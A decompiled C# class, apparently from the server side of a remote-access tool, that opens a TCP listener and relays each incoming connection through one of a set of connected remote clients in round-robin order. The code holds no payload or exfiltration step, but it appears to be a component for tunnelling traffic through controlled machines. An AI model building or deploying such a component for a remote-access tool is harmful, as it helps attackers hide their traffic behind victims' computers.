using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using Server.Connection;

namespace Server.Helper
{
	// Token: 0x02000030 RID: 48
	public class ReverseProxyServer
	{
		// Token: 0x14000009 RID: 9
		// (add) Token: 0x060001FE RID: 510 RVA: 0x000107DC File Offset: 0x000107DC
		// (remove) Token: 0x060001FF RID: 511 RVA: 0x00010818 File Offset: 0x00010818
		public event ReverseProxyServer.ConnectionEstablishedCallback OnConnectionEstablished;

		// Token: 0x1400000A RID: 10
		// (add) Token: 0x06000200 RID: 512 RVA: 0x00010854 File Offset: 0x00010854
		// (remove) Token: 0x06000201 RID: 513 RVA: 0x00010890 File Offset: 0x00010890
		public event ReverseProxyServer.UpdateConnectionCallback OnUpdateConnection;

		// Token: 0x17000073 RID: 115
		// (get) Token: 0x06000202 RID: 514 RVA: 0x000108CC File Offset: 0x000108CC
		public ReverseProxyClient[] ProxyClients
		{
			get
			{
				List<ReverseProxyClient> clients = this._clients;
				ReverseProxyClient[] result;
				lock (clients)
				{
					result = this._clients.ToArray();
				}
				return result;
			}
		}

		// Token: 0x17000074 RID: 116
		// (get) Token: 0x06000203 RID: 515 RVA: 0x0001091C File Offset: 0x0001091C
		public ReverseProxyClient[] OpenConnections
		{
			get
			{
				List<ReverseProxyClient> clients = this._clients;
				ReverseProxyClient[] result;
				lock (clients)
				{
					List<ReverseProxyClient> list = new List<ReverseProxyClient>();
					for (int i = 0; i < this._clients.Count; i++)
					{
						if (this._clients[i].ProxySuccessful)
						{
							list.Add(this._clients[i]);
						}
					}
					result = list.ToArray();
				}
				return result;
			}
		}

		// Token: 0x17000075 RID: 117
		// (get) Token: 0x06000204 RID: 516 RVA: 0x000109B0 File Offset: 0x000109B0
		// (set) Token: 0x06000205 RID: 517 RVA: 0x000109B8 File Offset: 0x000109B8
		public Clients[] Clients { get; private set; }

		// Token: 0x06000206 RID: 518 RVA: 0x000109C4 File Offset: 0x000109C4
		public ReverseProxyServer()
		{
			this._clients = new List<ReverseProxyClient>();
		}

		// Token: 0x06000207 RID: 519 RVA: 0x000109D8 File Offset: 0x000109D8
		public void StartServer(Clients[] clients, string ipAddress, ushort port)
		{
			this.Stop();
			this.Clients = clients;
			this._socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			this._socket.Bind(new IPEndPoint(IPAddress.Parse(ipAddress), (int)port));
			this._socket.Listen(100);
			this._socket.BeginAccept(new AsyncCallback(this.AsyncAccept), null);
		}

		// Token: 0x06000208 RID: 520 RVA: 0x00010A44 File Offset: 0x00010A44
		private void AsyncAccept(IAsyncResult ar)
		{
			try
			{
				List<ReverseProxyClient> clients = this._clients;
				lock (clients)
				{
					checked
					{
						this._clients.Add(new ReverseProxyClient(this.Clients[(int)((IntPtr)(unchecked((ulong)this._clientIndex % (ulong)((long)this.Clients.Length))))], this._socket.EndAccept(ar), this));
					}
					this._clientIndex += 1U;
				}
			}
			catch
			{
			}
			try
			{
				this._socket.BeginAccept(new AsyncCallback(this.AsyncAccept), null);
			}
			catch
			{
			}
		}

		// Token: 0x06000209 RID: 521 RVA: 0x00010B14 File Offset: 0x00010B14
		public void Stop()
		{
			if (this._socket != null)
			{
				this._socket.Close();
				this._socket = null;
			}
			List<ReverseProxyClient> clients = this._clients;
			lock (clients)
			{
				foreach (ReverseProxyClient reverseProxyClient in new List<ReverseProxyClient>(this._clients))
				{
					reverseProxyClient.Disconnect();
				}
				this._clients.Clear();
			}
		}

		// Token: 0x0600020A RID: 522 RVA: 0x00010BC8 File Offset: 0x00010BC8
		public ReverseProxyClient GetClientByConnectionId(int connectionId)
		{
			List<ReverseProxyClient> clients = this._clients;
			ReverseProxyClient result;
			lock (clients)
			{
				result = this._clients.FirstOrDefault((ReverseProxyClient t) => t.ConnectionId == connectionId);
			}
			return result;
		}

		// Token: 0x0600020B RID: 523 RVA: 0x00010C30 File Offset: 0x00010C30
		internal void CallonConnectionEstablished(ReverseProxyClient proxyClient)
		{
			try
			{
				if (this.OnConnectionEstablished != null)
				{
					this.OnConnectionEstablished(proxyClient);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600020C RID: 524 RVA: 0x00010C70 File Offset: 0x00010C70
		internal void CallonUpdateConnection(ReverseProxyClient proxyClient)
		{
			try
			{
				if (!proxyClient.IsConnected)
				{
					List<ReverseProxyClient> clients = this._clients;
					lock (clients)
					{
						for (int i = 0; i < this._clients.Count; i++)
						{
							if (this._clients[i].ConnectionId == proxyClient.ConnectionId)
							{
								this._clients.RemoveAt(i);
								break;
							}
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				if (this.OnUpdateConnection != null)
				{
					this.OnUpdateConnection(proxyClient);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400012E RID: 302
		private Socket _socket;

		// Token: 0x0400012F RID: 303
		private readonly List<ReverseProxyClient> _clients;

		// Token: 0x04000131 RID: 305
		private uint _clientIndex;

		// Token: 0x02000D5E RID: 3422
		// (Invoke) Token: 0x06008A17 RID: 35351
		public delegate void ConnectionEstablishedCallback(ReverseProxyClient proxyClient);

		// Token: 0x02000D5F RID: 3423
		// (Invoke) Token: 0x06008A1B RID: 35355
		public delegate void UpdateConnectionCallback(ReverseProxyClient proxyClient);
	}
}
